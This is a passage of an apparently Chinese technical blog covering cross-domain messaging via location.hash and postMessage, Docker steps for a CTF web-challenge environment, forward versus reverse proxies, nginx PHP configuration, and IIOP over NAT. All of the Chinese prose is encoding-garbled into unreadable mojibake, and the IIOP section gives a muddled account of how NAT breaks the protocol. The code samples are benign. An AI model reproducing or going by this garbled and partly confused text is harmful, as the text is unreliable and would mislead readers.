å€¼</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> data = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>é¡µé¢ <code>http://laixiangran.cn/b.html</code> çš„ä»£ç ï¼š</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">&lt;script <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    // 1. è®¾ç½®çˆ¶é¡µé¢çš„ hash å€¼</span><br><span class="line">    <span class="attr">parent.location.hash</span> = <span class="string">&quot;world&quot;</span><span class="comment">;</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="postMessage-è·¨åŸŸ"><a href="#postMessage-è·¨åŸŸ" class="headerlink" title="postMessage è·¨åŸŸ"></a>postMessage è·¨åŸŸ</h2><blockquote>
<p>window.postMessage(messageï¼ŒtargetOrigin) æ–¹æ³•æ˜¯ HTML5 æ–°å¼•è¿›çš„ç‰¹æ€§ï¼Œå¯ä»¥ä½¿ç”¨å®ƒæ¥å‘å…¶å®ƒçš„ window å¯¹è±¡å‘é€æ¶ˆæ¯ï¼Œæ— è®ºè¿™ä¸ª window å¯¹è±¡æ˜¯å±äºåŒæºæˆ–ä¸åŒæºã€‚è¿™ä¸ªåº”è¯¥å°±æ˜¯ä»¥åè§£å†³ dom è·¨åŸŸé€šç”¨æ–¹æ³•äº†ã€‚</p>
<p>è°ƒç”¨ postMessage æ–¹æ³•çš„ window å¯¹è±¡æ˜¯æŒ‡è¦æ¥æ”¶æ¶ˆæ¯çš„é‚£ä¸€ä¸ª window å¯¹è±¡ï¼Œè¯¥æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•° message ä¸ºè¦å‘é€çš„æ¶ˆæ¯ï¼Œç±»å‹åªèƒ½ä¸ºå­—ç¬¦ä¸²ï¼›ç¬¬äºŒä¸ªå‚æ•° targetOrigin ç”¨æ¥é™å®šæ¥æ”¶æ¶ˆæ¯çš„é‚£ä¸ª window å¯¹è±¡æ‰€åœ¨çš„åŸŸï¼Œå¦‚æœä¸æƒ³é™å®šåŸŸï¼Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦ *ã€‚</p>
<p>éœ€è¦æ¥æ”¶æ¶ˆæ¯çš„ window å¯¹è±¡ï¼Œå¯æ˜¯é€šè¿‡ç›‘å¬è‡ªèº«çš„ message äº‹ä»¶æ¥è·å–ä¼ è¿‡æ¥çš„æ¶ˆæ¯ï¼Œæ¶ˆæ¯å†…å®¹å‚¨å­˜åœ¨è¯¥äº‹ä»¶å¯¹è±¡çš„ data å±æ€§ä¸­ã€‚</p>
</blockquote>
<p>é¡µé¢ <code>http://www.laixiangran.cn/a.html</code> çš„ä»£ç ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://laixiangran.cn/b.html&quot;</span> <span class="attr">id</span>=<span class="string">&quot;myIframe&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;test()&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 1. iframeè½½å…¥ &quot;http://laixiangran.cn/b.html é¡µé¢åä¼šæ‰§è¡Œè¯¥å‡½æ•°</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 2. è·å– http://laixiangran.cn/b.html é¡µé¢çš„ window å¯¹è±¡ï¼Œ</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// ç„¶åé€šè¿‡ postMessage å‘ http://laixiangran.cn/b.html é¡µé¢å‘é€æ¶ˆæ¯</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myIframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> win = iframe.<span class="property">contentWindow</span>;</span></span><br><span class="line"><span class="language-javascript">        win.<span class="title function_">postMessage</span>(<span class="string">&#x27;æˆ‘æ˜¯æ¥è‡ª http://www.laixiangran.cn/a.html é¡µé¢çš„æ¶ˆæ¯&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">å¤åˆ¶ä»£ç </span><br></pre></td></tr></table></figure>

<p>é¡µé¢ <code>http://laixiangran.cn/b.html</code> çš„ä»£ç ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// æ³¨å†Œ message äº‹ä»¶ç”¨æ¥æ¥æ”¶æ¶ˆæ¯</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        e = e || event; <span class="comment">// è·å–äº‹ä»¶å¯¹è±¡</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">data</span>); <span class="comment">// é€šè¿‡ data å±æ€§å¾—åˆ°å‘é€æ¥çš„æ¶ˆæ¯</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><blockquote>
<ul>
<li><a href="https://link.juejin.cn/?target=https://www.cnblogs.com/2050/p/3191744.html">jsä¸­å‡ ç§å®ç”¨çš„è·¨åŸŸæ–¹æ³•åŸç†è¯¦è§£</a></li>
<li><a href="https://link.juejin.cn/?target=https://zhuanlan.zhihu.com/p/28562290">è·¨åŸŸçš„é‚£äº›äº‹å„¿</a></li>
<li><a href="https://link.juejin.cn/?target=http://www.ruanyifeng.com/blog/2016/04/cors.html">è·¨åŸŸèµ„æºå…±äº« CORS è¯¦è§£</a></li>
</ul>
</blockquote>
<h1 id="è®°ä¸€æ¬¡dockeræ­å»ºå¤ç°webé¢˜ç›®ç¯å¢ƒ"><a href="#è®°ä¸€æ¬¡dockeræ­å»ºå¤ç°webé¢˜ç›®ç¯å¢ƒ" class="headerlink" title="è®°ä¸€æ¬¡dockeræ­å»ºå¤ç°webé¢˜ç›®ç¯å¢ƒ"></a>è®°ä¸€æ¬¡dockeræ­å»ºå¤ç°webé¢˜ç›®ç¯å¢ƒ</h1><h2 id="1-æ„é€ é•œåƒ"><a href="#1-æ„é€ é•œåƒ" class="headerlink" title="1.æ„é€ é•œåƒ"></a>1.æ„é€ é•œåƒ</h2><p><img src="/post/Noteless/image-20230122143200058.png" alt="image-20230122143200058"></p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸ª<code>Dockerfile</code>æ–‡ä»¶</p>
<blockquote>
<p><code>docker build -t image_name .</code><br>&#x2F;&#x2F;è¿™é‡Œæ˜¯åˆ©ç”¨<code>dockerfile</code>åˆ›å»ºä¸€ä¸ªå‘½åä¸º<code>image_name</code>çš„é•œåƒã€åé¢çš„ç‚¹ä¸èƒ½å°‘ã€‘</p>
</blockquote>
<p><img src="/post/Noteless/image-20230122143320959.png" alt="image-20230122143320959"></p>
<h2 id="2-æŸ¥çœ‹é•œåƒæ˜¯å¦åˆ›å»ºæˆåŠŸ"><a href="#2-æŸ¥çœ‹é•œåƒæ˜¯å¦åˆ›å»ºæˆåŠŸ" class="headerlink" title="2.æŸ¥çœ‹é•œåƒæ˜¯å¦åˆ›å»ºæˆåŠŸ"></a>2.æŸ¥çœ‹é•œåƒæ˜¯å¦åˆ›å»ºæˆåŠŸ</h2><blockquote>
<p><code>docker images</code></p>
</blockquote>
<p><img src="/post/Noteless/image-20230122144225392.png" alt="image-20230122144225392"></p>
<h2 id="3-è¿è¡Œå¯åŠ¨é•œåƒï¼Œåˆ›å»ºç¯å¢ƒ"><a href="#3-è¿è¡Œå¯åŠ¨é•œåƒï¼Œåˆ›å»ºç¯å¢ƒ" class="headerlink" title="3.è¿è¡Œå¯åŠ¨é•œåƒï¼Œåˆ›å»ºç¯å¢ƒ"></a>3.è¿è¡Œå¯åŠ¨é•œåƒï¼Œåˆ›å»ºç¯å¢ƒ</h2><blockquote>
<p><code>docker run -i -d -P image_name</code> </p>
</blockquote>
<p><img src="/post/Noteless/image-20230122144315740.png" alt="image-20230122144315740"></p>
<h2 id="4-æŸ¥çœ‹å®¹å™¨å¯åŠ¨ç«¯å£"><a href="#4-æŸ¥çœ‹å®¹å™¨å¯åŠ¨ç«¯å£" class="headerlink" title="4.æŸ¥çœ‹å®¹å™¨å¯åŠ¨ç«¯å£"></a>4.æŸ¥çœ‹å®¹å™¨å¯åŠ¨ç«¯å£</h2><blockquote>
<p><code>docker ps -a</code></p>
</blockquote>
<p><img src="/post/Noteless/image-20230122144348333.png" alt="image-20230122144348333"></p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯å†32768ç«¯å£è¿è¡Œ</p>
<blockquote>
<p>è®¿é—®<code>127.0.0.1:32768</code></p>
</blockquote>
<p><img src="/post/Noteless/image-20230122144453902.png" alt="image-20230122144453902"></p>
<p>æ­å»ºæˆåŠŸ</p>
<h2 id="5-å…³é—­å®¹å™¨"><a href="#5-å…³é—­å®¹å™¨" class="headerlink" title="5.å…³é—­å®¹å™¨"></a>5.å…³é—­å®¹å™¨</h2><blockquote>
<p><code>docker ps -a</code></p>
</blockquote>
<p><img src="/post/Noteless/image-20230122150253748.png" alt="image-20230122150253748"></p>
<blockquote>
<p><code>docker stop CONTAINER ID </code></p>
</blockquote>
<p><img src="/post/Noteless/image-20230122214402594.png" alt="image-20230122214402594"></p>
<h2 id="6-åˆ é™¤é•œåƒã€è§‰å¾—ç¯å¢ƒé•œåƒåé¢æœ‰ç”¨çš„å¯ä»¥ç•™ç€ã€‘"><a href="#6-åˆ é™¤é•œåƒã€è§‰å¾—ç¯å¢ƒé•œåƒåé¢æœ‰ç”¨çš„å¯ä»¥ç•™ç€ã€‘" class="headerlink" title="6.åˆ é™¤é•œåƒã€è§‰å¾—ç¯å¢ƒé•œåƒåé¢æœ‰ç”¨çš„å¯ä»¥ç•™ç€ã€‘"></a>6.åˆ é™¤é•œåƒã€è§‰å¾—ç¯å¢ƒé•œåƒåé¢æœ‰ç”¨çš„å¯ä»¥ç•™ç€ã€‘</h2><blockquote>
<p><code>docker images</code></p>
</blockquote>
<p><img src="/post/Noteless/image-20230122150428681.png" alt="image-20230122150428681"></p>
<blockquote>
<p><code>docker rmi IMAGE ID</code></p>
<p>&#x2F;&#x2F;æ³¨ï¼šæœ‰çš„éœ€è¦å¼ºåˆ¶ï¼Œæ‰€ä»¥éœ€è¦åœ¨åé¢åŠ ä¸Šå‚æ•°<code>-f</code></p>
</blockquote>
<p><img src="/post/Noteless/image-20230122214537155.png" alt="image-20230122214537155"></p>
<h2 id="ps-è¿›å…¥å®¹å™¨ç¯å¢ƒ"><a href="#ps-è¿›å…¥å®¹å™¨ç¯å¢ƒ" class="headerlink" title="ps.è¿›å…¥å®¹å™¨ç¯å¢ƒ"></a>ps.è¿›å…¥å®¹å™¨ç¯å¢ƒ</h2><blockquote>
<p><code>sudo docker exec -it filechecker_pro_max_web1_1 /bin/bash</code><br>#filechecker_pro_max_web1_1ä¸ºå®¹å™¨åå­—</p>
</blockquote>
<p><img src="/post/Noteless/image-20230314214001396.png" alt="image-20230314214001396"></p>
<h1 id="åå‘ä»£ç†å’Œæ­£å‘ä»£ç†çš„åŒºåˆ«"><a href="#åå‘ä»£ç†å’Œæ­£å‘ä»£ç†çš„åŒºåˆ«" class="headerlink" title="åå‘ä»£ç†å’Œæ­£å‘ä»£ç†çš„åŒºåˆ«"></a>åå‘ä»£ç†å’Œæ­£å‘ä»£ç†çš„åŒºåˆ«</h1><p>æ­£å‘ä»£ç†å’Œåå‘ä»£ç†éƒ½æ˜¯ä»£ç†æœåŠ¡å™¨çš„åº”ç”¨ï¼Œå®ƒä»¬çš„<code>ä¸»è¦åŒºåˆ«åœ¨äºä»£ç†æœåŠ¡å™¨çš„ä½ç½®å’Œä½œç”¨</code>ï¼š</p>
<blockquote>
<ul>
<li><p>æ­£å‘ä»£ç†ï¼ˆForward Proxyï¼‰ï¼šä»£ç†æœåŠ¡å™¨ä½äº<code>å®¢æˆ·ç«¯å’Œç›®æ ‡æœåŠ¡å™¨ä¹‹é—´</code>ï¼Œä»£ç†æœåŠ¡å™¨<code>å……å½“å®¢æˆ·ç«¯çš„ä»£è¡¨</code>ï¼Œå‘ç›®æ ‡æœåŠ¡å™¨<code>å‘é€è¯·æ±‚</code>å¹¶å°†å“åº”è¿”å›ç»™å®¢æˆ·ç«¯ã€‚å®¢æˆ·ç«¯å‘ä»£ç†æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œç„¶åä»£ç†æœåŠ¡å™¨å°†è¯·æ±‚è½¬å‘ç»™ç›®æ ‡æœåŠ¡å™¨ï¼Œæœ€ç»ˆå°†å“åº”è¿”å›ç»™å®¢æˆ·ç«¯ã€‚æ­£å‘ä»£ç†ä¸»è¦ç”¨äºè®¿é—®å¤–éƒ¨ç½‘ç»œæˆ–çªç ´è®¿é—®é™åˆ¶ï¼Œ<code>å®¢æˆ·ç«¯éœ€è¦çŸ¥é“ä»£ç†æœåŠ¡å™¨çš„å­˜åœ¨å¹¶å‘å…¶å‘å‡ºè¯·æ±‚</code>ã€‚</p>
</li>
<li><p>åå‘ä»£ç†ï¼ˆReverse Proxyï¼‰ï¼šä»£ç†æœåŠ¡å™¨ä½äº<code>ç›®æ ‡æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´</code>ï¼Œä»£ç†æœåŠ¡å™¨å……<code>å½“ç›®æ ‡æœåŠ¡å™¨çš„ä»£è¡¨</code>ï¼Œå‘ç›®æ ‡æœåŠ¡å™¨<code>æ¥æ”¶è¯·æ±‚</code>å¹¶å°†å“åº”è¿”å›ç»™å®¢æˆ·ç«¯ã€‚å®¢æˆ·ç«¯å‘ä»£ç†æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œä»£ç†æœåŠ¡å™¨æ ¹æ®ä¸€å®šè§„åˆ™å°†è¯·æ±‚è½¬å‘åˆ°ç›®æ ‡æœåŠ¡å™¨ä¸Šï¼Œå¹¶å°†ç›®æ ‡æœåŠ¡å™¨çš„å“åº”è¿”å›ç»™å®¢æˆ·ç«¯ã€‚åå‘ä»£ç†ä¸»è¦ç”¨äºè´Ÿè½½å‡è¡¡ã€å®‰å…¨æ§åˆ¶å’Œç¼“å­˜ç­‰æ–¹é¢ï¼Œ<code>å®¢æˆ·ç«¯ä¸éœ€è¦çŸ¥é“ç›®æ ‡æœåŠ¡å™¨çš„å­˜åœ¨</code>ã€‚</p>
</li>
</ul>
</blockquote>
<p>æ€»çš„æ¥è¯´ï¼Œæ­£å‘ä»£ç†å’Œåå‘ä»£ç†éƒ½æ˜¯ä»£ç†æœåŠ¡å™¨çš„åº”ç”¨ï¼Œå®ƒä»¬çš„ä¸»è¦åŒºåˆ«åœ¨äºä»£ç†æœåŠ¡å™¨çš„ä½ç½®å’Œä½œç”¨ã€‚</p>
<blockquote>
<p>æ­£å‘ä»£ç†æ˜¯å®¢æˆ·ç«¯å‘ä»£ç†æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œä»£ç†æœåŠ¡å™¨å†å‘ç›®æ ‡æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œå¹¶å°†å“åº”è¿”å›ç»™å®¢æˆ·ç«¯ï¼›</p>
<p>åå‘ä»£ç†æ˜¯å®¢æˆ·ç«¯å‘ä»£ç†æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œä»£ç†æœåŠ¡å™¨å†å°†è¯·æ±‚è½¬å‘åˆ°ç›®æ ‡æœåŠ¡å™¨ä¸Šï¼Œå¹¶å°†ç›®æ ‡æœåŠ¡å™¨çš„å“åº”è¿”å›ç»™å®¢æˆ·ç«¯ã€‚</p>
</blockquote>
<h1 id="ä»¥nginxä¸ºä¾‹ï¼Œè®¿é—®é™æ€æ–‡ä»¶ä¸phpæ–‡ä»¶åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•é…ç½®phpæ–‡ä»¶çš„è§£æï¼Ÿ"><a href="#ä»¥nginxä¸ºä¾‹ï¼Œè®¿é—®é™æ€æ–‡ä»¶ä¸phpæ–‡ä»¶åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•é…ç½®phpæ–‡ä»¶çš„è§£æï¼Ÿ" class="headerlink" title="ä»¥nginxä¸ºä¾‹ï¼Œè®¿é—®é™æ€æ–‡ä»¶ä¸phpæ–‡ä»¶åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•é…ç½®phpæ–‡ä»¶çš„è§£æï¼Ÿ"></a>ä»¥nginxä¸ºä¾‹ï¼Œè®¿é—®é™æ€æ–‡ä»¶ä¸phpæ–‡ä»¶åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•é…ç½®phpæ–‡ä»¶çš„è§£æï¼Ÿ</h1><blockquote>
<p>åœ¨Nginxä¸­ï¼Œè®¿é—®é™æ€æ–‡ä»¶å’ŒPHPæ–‡ä»¶çš„å¤„ç†æ–¹å¼æœ‰æ‰€ä¸åŒã€‚é™æ€æ–‡ä»¶é€šå¸¸æ˜¯æŒ‡å›¾ç‰‡ã€CSSã€JavaScriptç­‰ä¸éœ€è¦åŠ¨æ€ç”Ÿæˆçš„æ–‡ä»¶ï¼Œè€ŒPHPæ–‡ä»¶åˆ™æ˜¯éœ€è¦åŠ¨æ€ç”ŸæˆHTMLå†…å®¹çš„æ–‡ä»¶ã€‚</p>
</blockquote>
<blockquote>
<p>å¯¹äºé™æ€æ–‡ä»¶çš„è®¿é—®ï¼ŒNginxå¯ä»¥ç›´æ¥è¿”å›è¿™äº›æ–‡ä»¶ï¼Œä¸éœ€è¦å¯¹å…¶è¿›è¡Œä»»ä½•å¤„ç†ï¼Œè¿™å¯ä»¥æé«˜Nginxçš„å“åº”é€Ÿåº¦å’Œæ€§èƒ½ã€‚é…ç½®Nginxå¤„ç†é™æ€æ–‡ä»¶çš„æ–¹å¼é€šå¸¸å¦‚ä¸‹ï¼š</p>
</blockquote>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">location /<span class="keyword">static</span> &#123;</span><br><span class="line">    root /<span class="built_in">var</span>/www/example.com;</span><br><span class="line">    <span class="keyword">index</span> <span class="keyword">index</span>.html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ä¸Šé¢çš„é…ç½®è¡¨ç¤ºï¼Œå½“è®¿é—®&#x2F;example.com&#x2F;staticæ—¶ï¼ŒNginxä¼šå°†è¯·æ±‚æ˜ å°„åˆ°&#x2F;var&#x2F;www&#x2F;example.com&#x2F;staticç›®å½•ä¸‹ï¼Œå¹¶è¿”å›è¯¥ç›®å½•ä¸‹çš„index.htmlæ–‡ä»¶ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ã€‚</p>
</blockquote>
<blockquote>
<p>å¯¹äº<code>PHPæ–‡ä»¶</code>çš„è®¿é—®ï¼Œ<code>Nginx</code>éœ€è¦å°†è¯·æ±‚å‘é€ç»™<code>PHPè§£é‡Šå™¨</code>è¿›è¡Œå¤„ç†ï¼Œå¹¶å°†è§£æåçš„ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚ä¸ºäº†å®ç°è¿™ä¸€åŠŸèƒ½ï¼Œéœ€è¦é…ç½®Nginxä¸PHPè§£é‡Šå™¨ä¹‹é—´çš„é€šä¿¡æ–¹å¼ã€‚é€šå¸¸ï¼Œå¯ä»¥ä½¿ç”¨FastCGIåè®®æ¥å®ç°Nginxä¸PHPè§£é‡Šå™¨ä¹‹é—´çš„é€šä¿¡ï¼Œå…·ä½“é…ç½®æ–¹å¼å¦‚ä¸‹ï¼š</p>
</blockquote>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">    <span class="attribute">root</span> /var/www/example.com;</span><br><span class="line">    <span class="attribute">index</span> index.php index.html;</span><br><span class="line">    <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.php?<span class="variable">$args</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">    <span class="attribute">fastcgi_pass</span> unix:/run/php-fpm/php-fpm.sock;</span><br><span class="line">    <span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">    <span class="attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">    <span class="attribute">include</span> fastcgi_params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ä¸Šé¢çš„é…ç½®è¡¨ç¤ºï¼Œå½“è®¿é—®&#x2F;example.comæ—¶ï¼ŒNginxä¼šé¦–å…ˆæŸ¥æ‰¾è¯¥ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨è¯·æ±‚çš„æ–‡ä»¶ï¼Œå¦‚æœå­˜åœ¨åˆ™ç›´æ¥è¿”å›è¯¥æ–‡ä»¶ï¼Œå¦åˆ™å°†è¯·æ±‚è½¬å‘åˆ°FastCGIæœåŠ¡ï¼ŒFastCGIæœåŠ¡ä¼šå°†è¯·æ±‚å‘é€ç»™PHPè§£é‡Šå™¨è¿›è¡Œå¤„ç†ã€‚å…¶ä¸­ï¼Œlocation ~ .php$ è¡¨ç¤ºåŒ¹é…æ‰€æœ‰ä»¥.phpç»“å°¾çš„è¯·æ±‚ï¼Œfastcgi_passæŒ‡å®šäº†PHPè§£é‡Šå™¨çš„åœ°å€ï¼ŒSCRIPT_FILENAMEæŒ‡å®šäº†PHPè§£é‡Šå™¨éœ€è¦å¤„ç†çš„æ–‡ä»¶è·¯å¾„ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œéœ€è¦å®‰è£…PHPè§£é‡Šå™¨å’ŒFastCGIæœåŠ¡ï¼Œå…·ä½“å®‰è£…æ–¹å¼å¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£æˆ–å…¶ä»–èµ„æºã€‚</p>
</blockquote>
<h1 id="IIOPçš„NATç½‘ç»œé—®é¢˜"><a href="#IIOPçš„NATç½‘ç»œé—®é¢˜" class="headerlink" title="IIOPçš„NATç½‘ç»œé—®é¢˜"></a>IIOPçš„NATç½‘ç»œé—®é¢˜</h1><blockquote>
<p>IIOPï¼ˆInternet Inter-ORB Protocolï¼‰æ˜¯ä¸€ç§<strong>ç”¨äºä¸åŒè®¡ç®—æœºä¹‹é—´é€šä¿¡çš„åè®®</strong>ï¼Œå¸¸ç”¨äºåˆ†å¸ƒå¼åº”ç”¨ç¨‹åºä¸­ã€‚ç„¶è€Œï¼Œåœ¨ä½¿ç”¨IIOPæ—¶ï¼Œå¦‚æœæ¶‰åŠåˆ°NATï¼ˆç½‘ç»œåœ°å€è½¬æ¢ï¼‰ç½‘ç»œï¼Œåˆ™å¯èƒ½ä¼šé‡åˆ°ä¸€äº›é—®é¢˜ã€‚</p>
<p>NATæ˜¯ä¸€ç§å°†ç§æœ‰IPåœ°å€è½¬æ¢ä¸ºå…¬å…±IPåœ°å€çš„æŠ€æœ¯ï¼Œä»¥å®ç°åœ¨ä¸åŒç½‘ç»œä¹‹é—´é€šä¿¡ã€‚ä½†æ˜¯ï¼Œç”±äº<strong>NATä¼šä¿®æ”¹æ•°æ®åŒ…çš„æºåœ°å€å’Œç›®æ ‡åœ°å€</strong>ï¼Œå› æ­¤å¯èƒ½ä¼šå½±å“åˆ°IIOPé€šä¿¡çš„æ­£ç¡®æ€§å’Œå¯é æ€§ï¼Œ</p>
<p>å…·ä½“è¡¨ç°ä¸ºï¼š</p>
<ol>
<li>IIOP<code>è¯·æ±‚æ— æ³•åˆ°è¾¾ç›®æ ‡æœºå™¨</code>ï¼šç”±äºNATä¼šæ”¹å˜æ•°æ®åŒ…çš„æºIPåœ°å€ï¼Œå› æ­¤ï¼Œ<code>å½“ä¸€ä¸ªIIOPè¯·æ±‚ç¦»å¼€ç§æœ‰ç½‘ç»œæ—¶ï¼ŒNATä¼šå°†æºIPåœ°å€ä¿®æ”¹ä¸ºå…¬å…±IPåœ°å€</code>ã€‚ä½†æ˜¯ï¼Œ<u><strong>ç”±äºIIOPåè®®ä¸­åŒ…å«äº†æºIPåœ°å€ï¼Œå› æ­¤ï¼Œå½“å“åº”è¿”å›æ—¶ï¼Œå¦‚æœæºIPåœ°å€ä¸æ˜¯ç§æœ‰IPåœ°å€ï¼Œåˆ™å“åº”å°†æ— æ³•åˆ°è¾¾ç›®æ ‡æœºå™¨ï¼Œå¯¼è‡´é€šä¿¡å¤±è´¥</strong></u>ã€‚</li>
<li>IIOP<code>å“åº”æ— æ³•åˆ°è¾¾æºæœºå™¨</code>ï¼šç±»ä¼¼åœ°ï¼Œå½“ä¸€ä¸ªIIOPè¯·æ±‚åˆ°è¾¾ç›®æ ‡æœºå™¨æ—¶ï¼Œ<code>NATä¼šå°†ç›®æ ‡IPåœ°å€ä¿®æ”¹ä¸ºç§æœ‰IPåœ°å€ï¼Œä»¥ä¾¿å°†å“åº”è¿”å›åˆ°æºæœºå™¨</code>ã€‚ä½†æ˜¯ï¼Œ<u><strong>ç”±äºIIOPåè®®ä¸­åŒ…å«äº†ç›®æ ‡IPåœ°å€ï¼Œå› æ­¤ï¼Œå¦‚æœå“åº”è¿”å›çš„ç›®æ ‡IPåœ°å€ä¸æ˜¯å…¬å…±IPåœ°å€ï¼Œåˆ™å“åº”æ— æ³•åˆ°è¾¾æºæœºå™¨ï¼Œå¯¼è‡´é€šä¿¡å¤±è´¥</strong></u>ã€‚</li>
<li>IIOP<code>ä¼šè¯ç»ˆæ­¢</code>ï¼šå¦‚æœä¸€ä¸ªIIOPä¼šè¯çš„<code>ä»»ä¸€æ–¹åœ¨ä½¿ç”¨NATç½‘ç»œ</code>æ—¶<code>å‘ç”Ÿåœ°å€è½¬æ¢</code>ï¼Œé‚£ä¹ˆä¼šè¯å¯èƒ½ä¼šåœ¨NATè®¾å¤‡ä¸Šç»ˆæ­¢ï¼Œ<code>å¯¼è‡´é€šä¿¡ä¸­æ–­</code>ã€‚</li>
</ol>
<p>ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼Œå¯ä»¥ä½¿ç”¨ä¸€äº›æŠ€æœ¯ï¼Œä¾‹å¦‚<code>ç«¯å£æ˜ å°„ã€åå‘ä»£ç†</code>ç­‰ï¼Œä»¥ç¡®ä¿IIOPè¯·æ±‚å’Œå“åº”æ­£ç¡®åˆ°è¾¾ç›®æ ‡æœºå™¨å’Œæºæœºå™¨ã€‚</p>
</blockquote>
<p>é‚£ä¹ˆå¯ä»¥æ ¹æ®ç½‘ç«™ç¼–å†™çš„è¯­è¨€ï¼Œç”¨å¯¹åº”çš„è¯­è¨€å¯¹iiopçš„è§„åˆ™è¿›è¡Œé‡å†™ï¼Œä»¥è¾¾åˆ°å‡å°‘é€šè®¯å†²çªçš„ç»“æœ</p>
<p>ä»¥<code>java</code>å’Œ<code>go</code>å¯¹iiopçš„è§„åˆ™è¿›è¡Œé‡å†™ä¸ºä¾‹</p>
<blockquote>
<p>Javaå¯ä»¥ä½¿ç”¨ä¸€äº›æŠ€æœ¯æ¥é‡å†™IIOPè§„åˆ™ï¼Œä»¥ç¡®ä¿IIOPåœ¨NATç½‘ç»œä¸­çš„æ­£ç¡®æ€§å’Œå¯é æ€§ã€‚å…·ä½“æ¥è¯´ï¼Œä»¥ä¸‹æ˜¯å‡ ç§JavaæŠ€æœ¯ï¼š</p>
<ol>
<li>ä½¿ç”¨Java Naming and Directory Interface (JNDI)ï¼š<code>JNDI</code>æ˜¯Javaä¸­ç”¨äºè®¿é—®å‘½åå’Œç›®å½•æœåŠ¡çš„APIã€‚å¯ä»¥ä½¿ç”¨JNDIæ¥è¿æ¥åˆ°IIOPæœåŠ¡å™¨ï¼Œå¹¶é€šè¿‡<code>å‘½åæœåŠ¡çš„åç§°è§£æ</code>æ¥<code>é¿å…åœ¨IIOPè¯·æ±‚å’Œå“åº”ä¸­ä½¿ç”¨IPåœ°å€</code>ã€‚è¿™æ ·å¯ä»¥<code>å‡å°‘NATå¯¹IIOPè¯·æ±‚å’Œå“åº”çš„å½±å“</code>ã€‚</li>
